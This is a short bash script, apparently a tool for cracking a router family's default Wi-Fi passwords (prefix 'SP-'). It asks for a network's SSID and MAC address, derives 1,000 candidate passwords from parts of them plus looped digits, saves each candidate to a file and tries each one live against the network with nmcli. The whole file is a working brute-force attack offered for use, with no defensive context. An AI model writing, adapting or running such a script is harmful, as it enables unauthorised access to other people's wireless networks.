#!/bin/bash

CODE1='nmcli -s -w 5 device wifi con '
CODE2=' password '
CODE3=''
PRE='SP-'

echo 'Insert the Router Information'
echo -n 'SSID:'
read SSID
echo -n 'MAC:'
read MAC

echo 'Where to save the password list?'
echo -n 'Dateiname:'
read Dateiname

G=${SSID:9:1}
H=${SSID:10:1}
D=${MAC:13:1}
E=${MAC:15:1}
F=${MAC:16:1}

for X in {0..9}; do
for Y in {0..9}; do
for Z in {0..9}; do
echo $PRE$G$Z$H$D$E$F$X$Y$Z >> $Dateiname
echo $CODE1$SSID$CODE2$PRE$G$Z$H$D$E$F$X$Y$Z$CODE3
$CODE1$SSID$CODE2$PRE$G$Z$H$D$E$F$X$Y$Z$CODE3

done
done
done
